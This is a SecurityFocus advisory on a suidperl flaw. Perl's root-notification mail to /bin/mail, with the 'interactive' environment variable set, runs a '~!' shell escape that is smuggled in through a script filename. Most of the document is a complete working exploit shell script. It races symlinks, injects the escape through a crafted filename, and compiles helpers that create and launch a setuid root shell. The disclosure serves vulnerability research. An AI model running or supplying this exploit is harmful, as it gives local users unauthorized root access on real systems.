source: http://www.securityfocus.com/bid/1547/info
 
The interaction between some security checks performed by suidperl, the setuid version of perl, and the /bin/mail program creates a scenario that allows local malicious users to execute commands with root privileges.
 
The suidperl program performs a number of checks to make sure it can't be fooled into executing a perl script with root privileges when its not suid root. When one of these checks fails the program will compose a message to the root user. The mail message looks like this:
 
From: Bastard Operator <root@nimue.tpi.pl>
To: root@nimue.tpi.pl
 
User 500 tried to run dev 769 ino 343180 in place of dev 769 ino 343183!
(Filename of set-id script was /some/thing, uid 500 gid 500.)
 
Sincerely,
perl
 
The name of the script to execute (inserted into the message) is taken from the program's argument list (argv[1]). suidperl executes /bin/mail to inject the message into the mail system. It does so without cleaning the environment or dropping its root privileges. The /bin/mail program has an undocumented feature. By setting the environment variable "interactive" to any value, /bin/mail will interpret the sequence "~!" as an escape sequence to start a shell and execute commands even when the program is not attached to a terminal. The environment variable "interactive" can be also set from ~/.mailrc with a "set interactive" line.
 
A malicous user can create a file with an escape sequence and commands embedded in the file name, then execute suidperl in such a way that the security check fails. suidperl will send a message to root via /bin/mail with the escape sequence embedded in the message. This will cause /bin/mail to start a root shell and execute the commands.

#!/bin/sh

#
#    -- PLEASE READ THESE COMMENTS CAREFULLY BEFORE TRYING ANYTHING --
#
# Wonderful, lovely, world-smashing, exciting perl exploit. It works against
# +s suidperl, exploiting undocumented /bin/mail feature when perl wants to
# notify root on inode race conditions. Currently, tested under RH Linux.
#
# What's probably most shocking, buggy code has following comment inside:
# /* heh, heh */. I guess author wasn't laughning last.
#
# Development history of this exploit is really funny. I found this condition
# about 4 months ago, but thought it's useless (who wants to notify root?).
# I deleted my test code and didn't left any notes on it. Then, month after
# this discovery, Sebastian contacted me. He was working on perl exploit.
# He told me he don't know how to cause this condition to happen, but
# if he realise how he can do it, he'll be able to use undocumented /bin/mail
# feature - environmental variable 'interactive', which, if set, causes
# /bin/mail to interpret ~! commands (subshell requests) even if stdin is not
# on terminal. And then I understood what I've done. I spent next month
# (yes! no kidding!) trying to recall what the fsck was the condition. I
# remembered it was trivial, even annoying... And finally, now I'm able to
# reconstruct it.
#
# This exploit tries to fit in rather short, but reasonable time window in
# order to exploit it. I tested it on fast, not overloaded Linux box, and
# I guess on slow machines it needs tunning. It needs anything setuid
# (/usr/bin/passwd is just fine), writable working directory and something
# around 4 minutes. Working directory should be mounted without noexec or
# nosuid options (if so, find something like /var/lib/svgalib etc).
#
# WARNING: On slow machines, it's quite possible this exploit will cause
# heavy load. Please test it when system is not overloaded and not used
# (eg. at night).
#
#
# I'd like to thank Sebastian Krahmer for his help (in fact, HE discovered it
# - I think I can say it without shame), and especially thank to several of
# my braincells that survived monitor radiation and made me recall this
# race condition.
#
# Send comments, ideas and flames to <lcamtuf@ids.pl>
# Tested with sperl 5.00503, but should work with any other as well.
#
# Good luck and don't abuse it.
#

clear

echo "Suidperl 5.00503 (and newer) root exploit"
echo "-----------------------------------------"
echo "Written by Michal Zalewski <lcamtuf@dione.ids.pl>"
echo "With great respect to Sebastian Krahmer..."
echo

SUIDPERL=/usr/bin/suidperl
SUIDBIN=/usr/bin/passwd

echo "[*] Using suidperl=$SUIDPERL, suidbin=$SUIDBIN..."

if [ ! -u $SUIDPERL ]; then
  echo "[-] Sorry, $SUIDPERL4 is NOT setuid on this system or"
  echo "    does not exist at all. If there's +s perl binary available,"
  echo "    please change SUIDPERL variable within exploit code."
  echo
  exit 0
fi


if [ ! -u $SUIDBIN ]; then
  echo "[-] Sorry, $SUIDBIN is NOT setuid on this system or does not exist at"
  echo "    all. Please pick any other +s binary and change SUIDBIN variable"
  echo "    within exploit code."
  echo
  exit 0
fi

echo "[+] Checks passed, compiling flares and helper applications..."
echo

cat >flare <<__eof__
#!/usr/bin/suidperl

print "Nothing can stop me now...\n";

__eof__

cat >bighole.c <<__eof__
main() {
  setuid(0);
  setgid(0);
  chown("sush",0,0);
  chmod("sush",04755);
}
__eof__

cat >sush.c <<__eof__
main() {
  setuid(0);
  setgid(0);
  system("/bin/bash");
}
__eof__

make bighole sush

echo

if [ ! -x ./sush ]; then
  echo "[-] Oops, seems to me I cannot compile helper applications. Either"
  echo "    you don't have working 'make' or 'gcc' utility. If possible,"
  echo "    please compile bighole.c and sush.c manually (to bighole and sush)."
  echo 
  exit 0
fi

echo "[+] Setting up environment..."

chmod 4755 ./flare

FILENAME='none

~!bighole

'
export interactive=1
PATH=.:$PATH

echo "[+] Starting exploit. It could take up to 5 minutes in order to get"
echo "[+] working root shell. WARNING - WARNING - WARNING: it could cause"
echo "[+] heavy system load."

while :; do
  ( ln -f -s $SUIDBIN "$FILENAME";usleep $RANDOM; nice -n +20 $SUIDPERL ./"$FILENAME" <./flare & ) &>/dev/null &
  ( usleep $RANDOM ; ln -f -s /dev/stdin "$FILENAME" ) &>/dev/null &
  if [ -u ./sush ]; then
    echo
    echo "[+] VOILA, BABE :-) Entering rootshell..."
    echo
    rm -f "$FILENAME" sush.c bighole bighole.c flare
    ./sush
    echo
    echo "[+] Thank you for using Marchew Industries / dupa.ryba products."
    echo
    rm -f "$FILENAME" sush.c bighole bighole.c flare sush
    exit 0
  fi
done
